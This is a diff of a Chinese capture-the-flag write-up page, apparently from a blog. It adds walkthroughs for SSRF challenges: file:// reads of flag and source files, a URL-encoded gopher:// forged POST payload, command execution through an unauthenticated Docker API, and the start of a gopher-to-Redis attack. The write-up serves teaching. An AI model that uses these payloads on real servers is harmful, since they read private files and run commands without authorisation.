@@ -15,7 +15,7 @@
 <meta name="twitter:description" content="前言 到最后了，/(ㄒoㄒ)/~~\nEZXSS EZXSS（存储型 XSS） 漏洞类型： 存储型 XSS（Stored Cross-Site Scripting）\n题目分析：\n目标是一个技术博客网站，包含搜索框和留言板功能。经测试：\n"><meta name="twitter:card" content="summary_large_image">
     <meta name="twitter:image" content='https://blog.xxchenchen.top/img/qingcenctf-cover.svg' />
     <link rel="shortcut icon" href="/favicon.png" />
-<link rel="stylesheet" href='/css/custom.css?v=1782038782'>
+<link rel="stylesheet" href='/css/custom.css?v=1782042230'>
 
     </head>
     <body class="
@@ -311,10 +311,10 @@
         <li><a href="#ezssrf基础-ssrf-内网端口探测">EZSSRF（基础 SSRF 内网端口探测）</a></li>
         <li><a href="#ezssrf_1ssrf--ip-黑名单绕过--十六进制编码">EZSSRF_1（SSRF + IP 黑名单绕过 — 十六进制编码）</a></li>
         <li><a href="#ezssrf_2ssrf--ip-多重编码绕过--混合十六进制表示法">EZSSRF_2（SSRF + IP 多重编码绕过 — 混合十六进制表示法）</a></li>
-        <li><a href="#ezssrf_3">EZSSRF_3</a></li>
-        <li><a href="#ezssrf_4">EZSSRF_4</a></li>
-        <li><a href="#ezssrf_5">EZSSRF_5</a></li>
-        <li><a href="#ezssrf_6">EZSSRF_6</a></li>
+        <li><a href="#ezssrf_3ssrf--file-协议本地文件读取">EZSSRF_3（SSRF + file:// 协议本地文件读取）</a></li>
+        <li><a href="#ezssrf_4ssrf--file-读源码--gopher-协议构造-post-请求">EZSSRF_4（SSRF + file:// 读源码 + gopher 协议构造 POST 请求）</a></li>
+        <li><a href="#ezssrf_5ssrf--docker-api-远程命令执行">EZSSRF_5（SSRF + Docker API 远程命令执行）</a></li>
+        <li><a href="#ezssrf_6ssrf--gopher-协议-redis-未授权访问">EZSSRF_6（SSRF + gopher 协议 Redis 未授权访问）</a></li>
       </ol>
     </li>
     <li><a href="#ezjwt">EZJWT</a>
@@ -581,7 +581,7 @@
 
 
                 <time class="article-time--reading">
-                    阅读时长: 11 分钟
+                    阅读时长: 17 分钟
                 </time>
             </div>
         
@@ -598,7 +598,7 @@
 
 
 
-                <span class="article-time--wordcount">5219 字</span>
+                <span class="article-time--wordcount">8418 字</span>
             </div>
         
     </footer>
@@ -1486,11 +1486,477 @@
 </span></span></code></pre></td></tr></table>
 </div>
 </div><p><strong>Flag：</strong> <code>flag{7b23f7e3-92fb-4a65-95d5-091852f917af}</code></p>
-<h3 id="ezssrf_3">EZSSRF_3
-</h3><h3 id="ezssrf_4">EZSSRF_4
-</h3><h3 id="ezssrf_5">EZSSRF_5
-</h3><h3 id="ezssrf_6">EZSSRF_6
-</h3><h2 id="ezjwt">EZJWT
+<h3 id="ezssrf_3ssrf--file-协议本地文件读取">EZSSRF_3（SSRF + file:// 协议本地文件读取）
+</h3><p><strong>漏洞类型：</strong> 服务端请求伪造（SSRF）— file:// 协议本地文件读取</p>
+<p><strong>题目分析：</strong></p>
+<p>目标是一个 &ldquo;URL Fetcher - Enterprise Edition&rdquo; 页面，提供一个 URL 输入框，服务端会代为请求用户输入的 URL 并回显响应内容。</p>
+<p>关键点：</p>
+<ul>
+<li>表单通过 POST 提交，参数名为 <code>url</code></li>
+<li>服务端对用户输入的 URL 发起请求，并将响应内容（HTTP 状态码、内容类型、响应大小、响应体）回显到页面上</li>
+<li>HTML 注释泄露提示：<code>&lt;!-- flag在/flag.txt里 --&gt;</code></li>
+<li>与 EZSSRF / EZSSRF_1 / EZSSRF_2 不同，本题没有内网端口探测的场景，也没有 IP 黑名单过滤</li>
+<li>本题的核心考点是：<strong>服务端未限制请求协议</strong>，允许使用 <code>file://</code> 协议直接读取本地文件</li>
+</ul>
+<p><strong>攻击思路：</strong> 利用 SSRF 的 <code>file://</code> 协议 → 直接读取服务器本地的 <code>/flag.txt</code> 文件 → 回显 flag</p>
+<p><strong>Step 1：分析页面结构</strong></p>
+<p>页面包含一个 POST 表单，参数 <code>url</code>，HTML 注释中泄露了 flag 位置：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;!--  flag在/flag.txt里  --&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>Step 2：确认 SSRF 可用</strong></p>
+<p>先用 <code>http://127.0.0.1/</code> 测试，返回页面自身内容（HTTP 200, 9388 bytes），确认 SSRF 正常工作：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">url=http://127.0.0.1/
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>Step 3：使用 file:// 协议读取本地 flag</strong></p>
+<p>直接使用 <code>file:///flag.txt</code> 读取服务器本地文件：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">url=file:///flag.txt
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>服务端返回：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">HTTP 状态码: N/A
+</span></span><span class="line"><span class="cl">内容类型: unknown
+</span></span><span class="line"><span class="cl">响应大小: 43 bytes
+</span></span><span class="line"><span class="cl">响应内容: flag{b83b873d-5858-4624-8fc0-4d73dbbd33e8}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>分析：</strong> 本题与前几题 EZSSRF 系列不同，没有 IP 黑名单、端口范围限制等防护，而是考察对 <code>file://</code> 协议的理解。服务端使用 cURL 等 HTTP 客户端库发起请求时，支持 <code>file://</code>、<code>ftp://</code>、<code>gopher://</code> 等多种协议。当未对协议类型做白名单限制时，攻击者可以直接用 <code>file://</code> 读取服务器本地任意文件。</p>
+<p><strong>Flag：</strong> <code>flag{b83b873d-5858-4624-8fc0-4d73dbbd33e8}</code></p>
+<h3 id="ezssrf_4ssrf--file-读源码--gopher-协议构造-post-请求">EZSSRF_4（SSRF + file:// 读源码 + gopher 协议构造 POST 请求）
+</h3><p><strong>漏洞类型：</strong> 服务端请求伪造（SSRF）— file:// 本地文件读取 + gopher 协议内网 POST 请求伪造</p>
+<p><strong>题目分析：</strong></p>
+<p>目标是一个 &ldquo;ImageHub - Image Upload Service&rdquo;，提供 URL 图片上传功能，服务端会代为请求用户输入的 URL 并将响应作为图片展示。</p>
+<p>关键点：</p>
+<ul>
+<li>表单通过 POST 提交，参数名为 <code>image_url</code></li>
+<li>页面明确说明支持 <strong>HTTP、HTTPS、FTP、Gopher、File</strong> 五种协议</li>
+<li>服务端使用 PHP cURL 发起请求，支持 <code>CURLOPT_FOLLOWLOCATION</code>（跟随重定向）</li>
+<li>无 IP 黑名单、无协议过滤</li>
+</ul>
+<p><strong>攻击思路：</strong> 第一步用 <code>file://</code> 读取源码，发现 <code>flag.php</code> 有 IP 限制且需要 POST JSON；第二步用 <code>gopher://</code> 协议构造原始 HTTP POST 请求绕过限制。</p>
+<p><strong>Step 1：确认 file:// 协议可用</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">url=file:///etc/passwd
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>返回 <code>root:x:0:0:root:/root:/bin/bash...</code>，确认 <code>file://</code> 协议可读取本地文件。</p>
+<p><strong>Step 2：枚举 Web 目录文件</strong></p>
+<p>通过 <code>/proc/self/cwd/</code> 列出 Web 根目录：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">url=file:///proc/self/cwd/
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>返回文件列表：<code>styles.css</code>、<code>template.html</code>、<code>index.php</code>、<code>flag.php</code></p>
+<p><strong>Step 3：读取 index.php 源码</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">url=file:///proc/self/cwd/index.php
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>源码显示服务端直接将用户 URL 传给 cURL，无任何过滤：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">fetch_image</span><span class="p">(</span><span class="nx">string</span> <span class="nv">$url</span><span class="p">)</span><span class="o">:</span> <span class="k">array</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$ch</span> <span class="o">=</span> <span class="nx">curl_init</span><span class="p">(</span><span class="nv">$url</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">curl_setopt_array</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="p">[</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">CURLOPT_RETURNTRANSFER</span> <span class="o">=&gt;</span> <span class="k">true</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">CURLOPT_FOLLOWLOCATION</span> <span class="o">=&gt;</span> <span class="k">true</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">CURLOPT_CONNECTTIMEOUT</span> <span class="o">=&gt;</span> <span class="mi">5</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">CURLOPT_TIMEOUT</span> <span class="o">=&gt;</span> <span class="mi">10</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="p">]);</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// ...
+</span></span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>Step 4：读取 flag.php 源码，分析访问条件</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">url=file:///proc/self/cwd/flag.php
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>关键源码：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$client_ip</span> <span class="o">=</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;REMOTE_ADDR&#39;</span><span class="p">]</span> <span class="o">??</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$allowed_ips</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;127.0.0.1&#39;</span><span class="p">,</span> <span class="s1">&#39;localhost&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">in_array</span><span class="p">(</span><span class="nv">$client_ip</span><span class="p">,</span> <span class="nv">$allowed_ips</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">http_response_code</span><span class="p">(</span><span class="mi">403</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="nx">json_encode</span><span class="p">([</span><span class="s1">&#39;error&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;Access denied&#39;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">exit</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// GET 请求返回源码，POST 请求需要 JSON body {&#34;action&#34;: &#34;get_flag&#34;}
+</span></span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;REQUEST_METHOD&#39;</span><span class="p">]</span> <span class="o">===</span> <span class="s1">&#39;POST&#39;</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$data</span> <span class="o">=</span> <span class="nx">json_decode</span><span class="p">(</span><span class="nx">file_get_contents</span><span class="p">(</span><span class="s1">&#39;php://input&#39;</span><span class="p">),</span> <span class="k">true</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$data</span><span class="p">[</span><span class="s1">&#39;action&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nv">$data</span><span class="p">[</span><span class="s1">&#39;action&#39;</span><span class="p">]</span> <span class="o">===</span> <span class="s1">&#39;get_flag&#39;</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$response</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;status&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;success&#39;</span><span class="p">,</span> <span class="s1">&#39;flag&#39;</span> <span class="o">=&gt;</span> <span class="nv">$processor</span><span class="o">-&gt;</span><span class="na">getFlag</span><span class="p">()];</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>三个条件：</p>
+<ol>
+<li><strong>IP 限制：</strong> <code>REMOTE_ADDR</code> 必须是 <code>127.0.0.1</code> 或 <code>localhost</code></li>
+<li><strong>请求方法：</strong> 必须是 POST</li>
+<li><strong>请求体：</strong> JSON 格式 <code>{&quot;action&quot;: &quot;get_flag&quot;}</code></li>
+</ol>
+<p><strong>Step 5：HTTP SSRF 验证 IP 限制可绕过</strong></p>
+<p>用 HTTP 协议访问 flag.php，因为请求从服务器自身发出，<code>REMOTE_ADDR</code> 为 <code>127.0.0.1</code>，IP 检查通过：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">url=http://127.0.0.1/flag.php
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>返回 flag.php 源码（GET 请求返回源码），说明 IP 限制已通过。但 GET 请求无法获取 flag，必须发 POST。</p>
+<p><strong>Step 6：用 gopher 协议构造原始 HTTP POST 请求</strong></p>
+<p>因为 SSRF 表单只能控制 URL，无法控制 cURL 的请求方法，所以用 <code>gopher://</code> 协议直接构造原始 HTTP POST 请求发给 <code>127.0.0.1:80</code>：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">url=gopher://127.0.0.1:80/_%50%4f%53%54%20%2f%66%6c%61%67%2e%70%68%70%20%48%54%54%50%2f%31%2e%30%0d%0a%48%6f%73%74%3a%20%31%32%37%2e%30%2e%30%2e%31%0d%0a%43%6f%6e%74%65%6e%74%2d%54%79%70%65%3a%20%61%70%70%6c%69%63%61%74%69%6f%6e%2f%6a%73%6f%6e%0d%0a%43%6f%6e%74%65%6e%74%2d%4c%65%6e%67%74%68%3a%20%32%32%0d%0a%0d%0a%7b%22%61%63%74%69%6f%6e%22%3a%20%22%67%65%74%5f%66%6c%61%67%22%7d
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>URL 解码后的原始 HTTP 请求：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">POST /flag.php HTTP/1.0
+</span></span><span class="line"><span class="cl">Host: 127.0.0.1
+</span></span><span class="line"><span class="cl">Content-Type: application/json
+</span></span><span class="line"><span class="cl">Content-Length: 22
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">{&#34;action&#34;: &#34;get_flag&#34;}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>⚠️ 关键踩坑点：</strong> <code>Content-Length</code> 必须精确等于请求体的字节数（<code>{&quot;action&quot;: &quot;get_flag&quot;}</code> = 22 字节）。如果长度不对，Apache 会等待剩余数据导致超时。</p>
+<p><strong>Step 7：获取 Flag</strong></p>
+<p>服务端返回：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&#34;status&#34;</span><span class="p">:</span> <span class="s2">&#34;success&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&#34;flag&#34;</span><span class="p">:</span> <span class="s2">&#34;flag{deebce61-d165-4842-b046-1ed4c168702b}&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>分析：</strong> 本题综合考察了两个 SSRF 技巧：</p>
+<ol>
+<li><strong>file:// 协议读源码</strong> — 通过 <code>/proc/self/cwd/</code> 定位 Web 目录，读取 <code>flag.php</code> 源码分析访问条件</li>
+<li><strong>gopher 协议构造 POST 请求</strong> — SSRF 表单只能让 cURL 发 GET 请求，但 <code>gopher://</code> 协议可以发送任意原始 TCP 数据，从而构造 POST 请求绕过方法限制</li>
+</ol>
+<p><strong>Flag：</strong> <code>flag{deebce61-d165-4842-b046-1ed4c168702b}</code></p>
+<h3 id="ezssrf_5ssrf--docker-api-远程命令执行">EZSSRF_5（SSRF + Docker API 远程命令执行）
+</h3><p><strong>漏洞类型：</strong> 服务端请求伪造（SSRF）— Docker API 未授权访问 + 容器内命令执行</p>
+<p><strong>题目分析：</strong></p>
+<p>目标是一个 &ldquo;URL 检测&rdquo; 页面，提供 URL、HTTP 方法（GET/POST）和请求体三个输入项，服务端会代为请求用户指定的地址。</p>
+<p>关键点：</p>
+<ul>
+<li>表单支持 GET/POST 方法和自定义请求体</li>
+<li>页面提示仅支持 http/https 协议</li>
+<li><strong>HTML 注释泄露关键信息：</strong> <code>&lt;!-- 内网依赖：Docker API 127.0.0.1:2375（运维文档） --&gt;</code></li>
+<li>Docker API 默认监听 2375 端口，无认证即可访问</li>
+</ul>
+<p><strong>攻击思路：</strong> 通过 SSRF 访问内网 Docker API → 列出容器 → 在目标容器内创建 exec 实例 → 启动 exec 执行命令读取 flag</p>
+<p><strong>Step 1：发现 Docker API 注释</strong></p>
+<p>页面 HTML 注释泄露了内网 Docker API 地址：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;!-- 内网依赖：Docker API 127.0.0.1:2375（运维文档） --&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>Step 2：确认 SSRF 可用并探测 Docker API</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">url=http://127.0.0.1:2375/
+</span></span><span class="line"><span class="cl">method=GET
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>返回 <code>HTTP 200 | OK</code>，确认 Docker API 可访问。</p>
+<p><strong>Step 3：列出容器信息</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">url=http://127.0.0.1:2375/containers/json
+</span></span><span class="line"><span class="cl">method=GET
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>返回容器信息，发现：</p>
+<ul>
+<li>容器名：<code>ctf_container</code></li>
+<li>容器 ID 前缀：<code>4f1d60ea7287</code></li>
+<li>镜像：<code>ubuntu:latest</code></li>
+<li>状态：<code>running</code></li>
+<li>IP：<code>172.17.0.2</code></li>
+</ul>
+<p><strong>Step 4：在容器内创建 exec 实例</strong></p>
+<p>通过 Docker API 的 <code>/containers/{id}/exec</code> 端点在容器内创建命令执行实例：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">url=http://127.0.0.1:2375/containers/4f1d60ea7287/exec
+</span></span><span class="line"><span class="cl">method=POST
+</span></span><span class="line"><span class="cl">body={&#34;AttachStdin&#34;:false,&#34;AttachStdout&#34;:true,&#34;AttachStderr&#34;:true,&#34;Tty&#34;:false,&#34;Cmd&#34;:[&#34;cat&#34;,&#34;/flag.txt&#34;]}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>返回 exec ID：<code>execc7353f7a7b01d7c9f462624f596456ce</code></p>
+<p><strong>Step 5：启动 exec 获取 flag（关键踩坑）</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">url=http://127.0.0.1:2375/exec/execc7353f7a7b01d7c9f462624f596456ce/start
+</span></span><span class="line"><span class="cl">method=POST
+</span></span><span class="line"><span class="cl">body={&#34;Detach&#34;:false,&#34;Tty&#34;:true}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>⚠️ 关键踩坑点：</strong> exec 的 <code>Tty</code> 参数决定了输出格式：</p>
+<ul>
+<li><code>Tty: false</code> → Docker API 返回 multiplexed 流，每个帧有 8 字节头（4 字节流类型 + 4 字节长度），SSRF 代理只读取了前几个字节，返回乱码</li>
+<li><code>Tty: true</code> → Docker API 返回原始文本流，SSRF 代理可直接读取</li>
+</ul>
+<p>使用 <code>Tty: true</code> 后，服务端返回：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">flag{de3aff20-53b5-40d3-bdbc-88a738997ff0}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>分析：</strong> 本题考察 SSRF + Docker API 未授权访问的组合利用：</p>
+<ol>
+<li><strong>信息收集</strong> — HTML 注释泄露内网 Docker API 地址</li>
+<li><strong>Docker API 利用</strong> — Docker API 默认无认证，通过 SSRF 可以列出容器、创建 exec、执行命令</li>
+<li><strong>exec 流格式</strong> — Docker exec API 的 TTY 参数影响输出格式，<code>Tty:true</code> 返回原始文本适合 SSRF 场景</li>
+</ol>
+<p><strong>Flag：</strong> <code>flag{de3aff20-53b5-40d3-bdbc-88a738997ff0}</code></p>
+<h3 id="ezssrf_6ssrf--gopher-协议-redis-未授权访问">EZSSRF_6（SSRF + gopher 协议 Redis 未授权访问）
+</h3><p><strong>漏洞类型：</strong> 服务端请求伪造（SSRF）— gopher 协议 + Redis 未授权访问</p>
+<p><strong>题目分析：</strong></p>
+<p>目标是一个 &ldquo;URL请求器&rdquo; 页面，仅提供 URL 输入框，服务端代为请求用户输入的地址。</p>
+<p>关键点：</p>
+<ul>
+<li>表单仅一个 URL 输入框，POST 提交</li>
+<li>支持 http/https/gopher 协议（<code>dict://</code> 等不支持）</li>
+<li><code>file://</code> 返回 &ldquo;Invalid URL&rdquo;</li>
+<li>HTML 无注释、无明显提示</li>
+</ul>
+<p><strong>攻击思路：</strong> 通过 SSRF 探测内网服务 → 发现 Redis 存储 flag → 用 gopher 协议发送 Redis 命令获取 flag</p>
+<p><strong>Step 1：确认 SSRF 可用</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">url=http://127.0.0.1/
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>返回 <code>Status: 200</code>，页面内容为自身，SSRF 正常工作。</p>
+<p><strong>Step 2：探测内网端口</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">url=http://127.0.0.1:6379/
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>返回 &ldquo;Empty reply from server&rdquo; — 端口开放但不返回 HTTP（Redis 服务）。</p>
+<p><strong>Step 3：读取 robots.txt 发现配置文件</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">url=http://127.0.0.1/robots.txt
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>返回：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">User-agent: *
+</span></span><span class="line"><span class="cl">Disallow: /config.bak
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>Step 4：读取 config.bak 发现 Redis 存储 flag</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">url=http://127.0.0.1/config.bak
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>返回：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">redis-cli -h 127.0.0.1 -p 6379 SET flag &#34;$FLAG&#34; &gt;/dev/null
+</span></span></code></pre></td></tr></table>
+</div>
